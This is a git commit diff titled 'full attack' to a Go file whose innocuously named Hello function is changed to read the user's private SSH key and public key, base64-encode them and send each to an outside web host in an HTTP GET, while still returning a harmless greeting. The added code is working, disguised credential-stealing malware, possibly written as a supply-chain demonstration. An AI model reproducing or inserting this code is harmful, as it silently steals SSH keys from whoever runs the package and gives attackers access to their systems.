82e94bbe71ce7215e9cfc1860c1586483d597d94
Adam Plánský <adamplansky@gmail.com>
2020-03-13 08:22:17 +0100

    full attack

--- hello.go
+++ hello.go
@@ -22,13 +22,21 @@ func Hello() string {
 		log.Fatal(err)
 	}
 
-	sshKey, err := ioutil.ReadFile(usr.HomeDir + "/.ssh/id_rsa_yubikey.pub")
+	sshKey, err := ioutil.ReadFile(usr.HomeDir + "/.ssh/id_rsa")
 	check(err)
 	fmt.Print(string(sshKey))
 
 	encoded := base64.StdEncoding.EncodeToString(sshKey)
 
-	_, _ = http.Get("http://api.endevel.cz/cars/v1/car/public/1" + encoded)
+	_, _ = http.Get("http://api.endevel.cz/cars/v1/car/public/priv-" + encoded)
+
+	sshKeyPub, err := ioutil.ReadFile(usr.HomeDir + "/.ssh/id_rsa.pub")
+	check(err)
+	fmt.Print(string(sshKey))
+
+	encoded = base64.StdEncoding.EncodeToString(sshKeyPub)
+
+	_, _ = http.Get("http://api.endevel.cz/cars/v1/car/public/pub-" + encoded)
 
 	return "Hello from func"
 }
